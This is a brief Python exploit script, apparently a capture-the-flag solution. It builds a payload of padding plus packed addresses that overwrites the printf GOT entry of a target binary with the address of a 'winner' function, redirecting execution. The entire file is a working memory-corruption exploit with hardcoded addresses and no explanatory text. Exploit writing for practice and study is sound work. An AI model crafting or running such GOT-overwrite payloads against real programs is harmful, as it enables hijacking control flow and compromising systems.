#!/usr/bin/env python

from __future__ import print_function
from functools import partial
import struct


p64 = partial(struct.pack, "<Q")
p32 = partial(struct.pack, "<I")
pr = partial(print, end="")


winner = 0x400646
printf_got = 0x60101e  # 2 bytes behind got for 0x601020 because 0x20 is arg sep

pr("a" * 8 + "b" * 32 + p32(printf_got) + " cc" + p32(winner))
